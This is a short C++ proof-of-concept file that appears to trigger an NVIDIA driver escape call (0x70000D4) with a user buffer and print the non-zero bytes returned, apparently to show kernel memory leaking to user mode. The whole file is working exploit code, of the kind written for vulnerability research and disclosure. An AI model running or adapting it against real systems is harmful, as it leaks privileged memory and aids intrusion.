// gpu_poc.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>

#include "Gpu.h"

struct Escape70000D4 {
  DWORD unknown_0;
  DWORD unknown_1;
  UINT64 unknown_2;
  UINT64 unknown_3;
  UINT64 unknown_4;
  DWORD unknown_5;
  DWORD user_ptr_size;
  void* user_ptr;
};

static_assert(sizeof(Escape70000D4) + sizeof(NvEscape) == 0x60, "escape size");

int main() {
  Gpu gpu;
  if (!gpu.Init()) {
    fprintf(stderr, "Failed to init gpu.\n");
    return 1;
  }

  while (true) {
    printf("Press enter...\n");
    (void)getchar();

    NvEscape* escape = MakeEscape(0x70000D4, 0x4e562a2a, sizeof(Escape70000D4));
    Escape70000D4* payload = reinterpret_cast<Escape70000D4*>(escape + 1);

    unsigned char buf[1024] = {};
    printf("address of buf = %p\n", buf);
    payload->user_ptr = buf;
    payload->user_ptr_size = 1024;

    gpu.Escape(escape, escape->size);

    for (size_t i = 0; i < 1024; ++i) {
      if (buf[i] != 0)
        printf("%x", buf[i]);
    }
    printf("\n");
  }

  return 0;
}

